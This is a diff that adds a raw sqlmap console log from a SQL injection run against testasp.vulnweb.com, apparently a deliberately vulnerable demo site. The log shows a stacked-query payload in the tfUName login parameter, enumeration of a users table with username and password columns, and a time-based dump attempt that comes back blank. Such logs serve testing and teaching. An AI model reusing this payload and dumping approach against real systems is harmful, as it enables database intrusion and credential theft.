@@ -1,0 +1,91 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.6.130#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:54:19 /2026-06-20/
+
+[06:54:22] [INFO] resuming back-end DBMS 'microsoft sql server' 
+[06:54:23] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('ASPSESSIONIDACAQRBTA=LKGGBKHCOJL...FMGHADHHFJ'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: tfUName (POST)
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: tfUName=admin';WAITFOR DELAY '0:0:1'--&tfUPass=pass
+---
+[06:54:24] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: Microsoft IIS 8.5, Django, ASP.NET, ASP
+back-end DBMS: Microsoft SQL Server 2014
+[06:54:24] [INFO] fetching columns for table 'users' in database 'acuforum'
+[06:54:24] [INFO] resumed: 5
+[06:54:24] [INFO] resumed: avatar
+[06:54:24] [INFO] resumed: email
+[06:54:24] [INFO] resumed: realname
+[06:54:24] [INFO] resumed: uname
+[06:54:24] [INFO] resumed: upass
+[06:54:24] [INFO] fetching entries for table 'users' in database 'acuforum'
+[06:54:24] [INFO] fetching number of entries for table 'users' in database 'acuforum'
+[06:54:24] [INFO] resumed: 2189
+[06:54:24] [INFO] resumed: 1
+[06:54:24] [INFO] resumed: una\x1dP
+[06:54:24] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
+
+[06:54:24] [INFO] retrieved: [06:54:24] [WARNING] (case) time-based comparison requires larger statistical model, please waitgot a 302 redirect to 'http://testasp.vulnweb.com/Default.asp'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[06:54:25] [WARNING] reflective value(s) found and filtering out
+.............................. (done)
+[06:54:48] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[06:54:50] [INFO] retrieved:   
+
+[06:54:50] [INFO] retrieved: 
+[06:54:56] [INFO] retrieved:   
+
+[06:54:56] [INFO] retrieved: 
+[06:55:01] [INFO] retrieved:   
+
+[06:55:01] [INFO] retrieved: 
+[06:55:04] [INFO] retrieved:   
+
+[06:55:04] [INFO] retrieved: 
+[06:55:08] [INFO] retrieved:   
+
+[06:55:08] [INFO] retrieved: 
+[06:55:10] [INFO] retrieved:   
+
+[06:55:10] [INFO] retrieved: 0x4
+[06:55:45] [ERROR] invalid character detected. retrying..
+900
+[06:56:13] [ERROR] invalid character detected. retrying..
+C[06:56:25] [WARNING] there was a problem decoding value '0x4900C' from expected hexadecimal form
+
+[06:56:25] [INFO] retrieved: I?         
+
+[06:56:25] [INFO] retrieved: 
+[06:56:28] [INFO] retrieved:   
+
+[06:56:28] [INFO] retrieved: 0
+[06:56:45] [ERROR] invalid character detected. retrying..
+F
+[06:56:59] [WARNING] Ctrl+C detected in dumping phase
+Database: acuforum
+Table: users
+[1 entry]
++---------+---------+---------+---------+----------+
+| email   | uname   | upass   | avatar  | realname |
++---------+---------+---------+---------+----------+
+| <blank> | <blank> | <blank> | <blank> | <blank>  |
++---------+---------+---------+---------+----------+
+
+[06:56:59] [INFO] table 'acuforum.dbo.users' dumped to CSV file '/root/.local/share/sqlmap/output/testasp.vulnweb.com/dump/acuforum/users.csv'
+[06:56:59] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/testasp.vulnweb.com'
+
+[*] ending @ 06:56:59 /2026-06-20/
+
